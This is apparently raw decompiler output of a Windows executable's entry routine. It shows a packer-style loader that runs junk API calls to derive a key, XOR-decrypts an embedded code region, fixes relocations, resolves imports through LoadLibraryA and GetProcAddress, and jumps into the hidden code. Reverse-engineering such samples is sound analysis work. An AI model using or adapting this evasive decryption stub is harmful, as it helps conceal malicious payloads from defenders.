/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(char *@<ebx>);

//-------------------------------------------------------------------------
// Data declarations

char byte_401290[] = { ' ' }; // weak
_UNKNOWN loc_401A60; // weak
int dword_402570[164] =
{
  1481176474,
  -1269022620,
  -1406224962,
  435127687,
  1566885233,
  -1557973082,
  -849749153,
  -1245164466,
  1622246956,
  2093461076,
  1754824726,
  -543284900,
  667573243,
  270491820,
  1794361246,
  -1091176064,
  575254493,
  2011233723,
  -1023710455,
  2009952036,
  -1329298468,
  -2138396408,
  -833086230,
  1018254876,
  -796547046,
  1206306545,
  -1926775094,
  -1554879560,
  -1922010653,
  768959769,
  1425002721,
  1872832713,
  -925753508,
  -146119216,
  -1592348663,
  -210752369,
  1717139785,
  1650839481,
  -1910932855,
  -1531921088,
  291736839,
  1419889706,
  -1429913986,
  -1004481937,
  -1126218441,
  1772261138,
  1914282171,
  1723698859,
  -762368073,
  715413137,
  501837106,
  1543817800,
  -1981227376,
  360683754,
  1907489670,
  -996774565,
  1906338136,
  -2028686244,
  -1217552663,
  -162125039,
  82931238,
  -389115812,
  2140733065,
  -1245018603,
  -1705225408,
  -1269282571,
  347364416,
  1839131015,
  1445663159,
  -244439306,
  -829400060,
  -1728149016,
  -897182337,
  1548959925,
  1481176474,
  -1269022540,
  -1628862700,
  722581357,
  1848047190,
  -1873017615,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAnyAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern BOOL (__stdcall *AddAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
char byte_404000[512] =
{
  '+',
  'V',
  'ö',
  '&',
  'n',
  'ñ',
  '\x04',
  '\\',
  '\x90',
  'Î',
  'è',
  '‰',
  'þ',
  '˜',
  '\x7F',
  '\x15',
  '†',
  'Ê',
  'µ',
  '@',
  'S',
  '\\',
  'š',
  'õ',
  'H',
  'X',
  '´',
  '@',
  '\\',
  '´',
  '\x14',
  '‡',
  'é',
  'ž',
  'm',
  '·',
  '\x11',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(char *a1@<ebx>)
{
  BOOL (__stdcall *v1)(PACL, DWORD, DWORD, LPVOID, DWORD); // esi
  int v2; // ebp
  int v3; // edi
  int v4; // edi
  int v5; // edi
  int v6; // edi
  int v7; // edi
  int v8; // edi
  int v9; // edi
  int v10; // edi
  int v11; // edi
  int v12; // edi
  int v13; // edi
  int v14; // edi
  int v15; // edi
  int v16; // edi
  int v17; // edi
  int v18; // edi
  int v19; // edi
  int v20; // edi
  int v21; // edi
  int v22; // edi
  int v23; // edi
  int v24; // edi
  int v25; // edi
  int v26; // edi
  int v27; // edi
  int v28; // edi
  int v29; // edi
  int v30; // edi
  int v31; // ecx
  unsigned int v32; // eax
  int *v33; // edx
  char *v34; // ebp
  char *v35; // eax
  _WORD *v36; // ecx
  unsigned int v37; // esi
  int v38; // eax
  char *v39; // ebx
  int v40; // edi
  int v41; // eax
  char *v42; // edi
  FARPROC *v43; // esi
  bool v44; // sf
  int v45; // ecx
  const CHAR *v46; // [esp-4h] [ebp-1Ch]
  HMODULE hModule; // [esp+10h] [ebp-8h]
  HMODULE hModulea; // [esp+10h] [ebp-8h]
  char *v49; // [esp+14h] [ebp-4h]

  v1 = AddAce;
  v2 = 0;
  v3 = AddAce(0, 0, 0, 0, 0) + 37;
  v4 = AddAce(0, 0, 0, 0, 0) + v3;
  v5 = AddAce(0, 0, 0, 0, 0) + v4;
  v6 = AddAce(0, 0, 0, 0, 0) + v5;
  v7 = AddAce(0, 0, 0, 0, 0) + v6;
  v8 = AddAce(0, 0, 0, 0, 0) + v7;
  v9 = AddAce(0, 0, 0, 0, 0) + v8;
  v10 = AddAce(0, 0, 0, 0, 0) + v9;
  v11 = AddAce(0, 0, 0, 0, 0) + v10;
  v12 = AddAce(0, 0, 0, 0, 0) + v11;
  v13 = AddAce(0, 0, 0, 0, 0) + v12;
  v14 = AddAce(0, 0, 0, 0, 0) + v13;
  v15 = AddAce(0, 0, 0, 0, 0) + v14;
  v16 = AddAce(0, 0, 0, 0, 0) + v15;
  v17 = AddAce(0, 0, 0, 0, 0) + v16;
  v18 = AddAce(0, 0, 0, 0, 0) + v17;
  v19 = AddAce(0, 0, 0, 0, 0) + v18;
  v20 = AddAce(0, 0, 0, 0, 0) + v19;
  v21 = AddAce(0, 0, 0, 0, 0) + v20;
  v22 = AddAce(0, 0, 0, 0, 0) + v21;
  v23 = AddAce(0, 0, 0, 0, 0) + v22;
  v24 = AddAce(0, 0, 0, 0, 0) + v23;
  v25 = AddAce(0, 0, 0, 0, 0) + v24;
  v26 = AddAce(0, 0, 0, 0, 0) + v25;
  v27 = AddAce(0, 0, 0, 0, 0) + v26;
  v28 = AddAce(0, 0, 0, 0, 0) + v27;
  v29 = AddAce(0, 0, 0, 0, 0) + v28;
  v30 = AddAce(0, 0, 0, 0, 0) + v29;
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v30 -= 34;
  v32 = 0;
  while ( 1 )
  {
    if ( v2 == v30 )
      v2 = 0;
    a1 = (char *)(v31 + 2 * (_DWORD)a1);
    LOBYTE(v31) = byte_404000[v2];
    byte_401290[v32] ^= v31;
    v1 = (BOOL (__stdcall *)(PACL, DWORD, DWORD, LPVOID, DWORD))((char *)v1 + v30);
    ++v32;
    ++v2;
    if ( v32 >= 0x1420 )
    {
      v33 = dword_402570;
      v34 = &byte_401290[-640];
      hModule = 0;
      while ( 1 )
      {
        v35 = (char *)((unsigned int)(v33[1] - 8) >> 1);
        v36 = v33 + 2;
        if ( v35 )
        {
          v37 = (unsigned int)(v33[1] - 8) >> 1;
          do
          {
            a1 = &v35[4 * (_DWORD)a1];
            LOWORD(v35) = *v36 & 0xF000;
            if ( (_WORD)v35 == 12288 )
            {
              v35 = &v34[*v33 + (*v36 & 0xFFF)];
              *(_DWORD *)v35 += &byte_401290[-268436096];
            }
            ++v36;
            --v37;
          }
          while ( v37 );
        }
        v38 = v33[1];
        v33 = (int *)((char *)v33 + v38);
        hModule = (HMODULE)((char *)hModule + v38);
        if ( (unsigned int)hModule >= 0xE4 )
        {
          v39 = &byte_401290[2780];
          v49 = &byte_401290[2780];
          if ( *(_DWORD *)&byte_401290[2796] )
          {
            do
            {
              hModulea = LoadLibraryA(&v34[*((_DWORD *)v39 + 3)]);
              CloseHandle((HANDLE)0x62);
              if ( hModulea )
              {
                v40 = *(_DWORD *)v39;
                if ( !*(_DWORD *)v39 )
                  v40 = *((_DWORD *)v39 + 4);
                v41 = *(_DWORD *)&v34[v40];
                v42 = &v34[v40];
                v43 = (FARPROC *)&v34[*((_DWORD *)v39 + 4)];
                v44 = v41 < 0;
                if ( v41 )
                {
                  do
                  {
                    if ( v44 )
                      v46 = (const CHAR *)*(unsigned __int16 *)v42;
                    else
                      v46 = &v34[v41 + 2];
                    *v43 = GetProcAddress(hModulea, v46);
                    v42 += 4;
                    v39 = (char *)(v45 + 4 * (_DWORD)v39);
                    v41 = *(_DWORD *)v42;
                    ++v43;
                    v44 = *(int *)v42 < 0;
                  }
                  while ( *(_DWORD *)v42 );
                  v39 = v49;
                }
              }
              v39 += 20;
              v49 = v39;
            }
            while ( *((_DWORD *)v39 + 4) );
          }
          ((void (*)(void))loc_401A60)();
          ExitProcess(0);
        }
      }
    }
  }
}
// 401127: variable 'v31' is possibly undefined
// 40122D: variable 'v45' is possibly undefined
// 402570: using guessed type int dword_402570[164];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
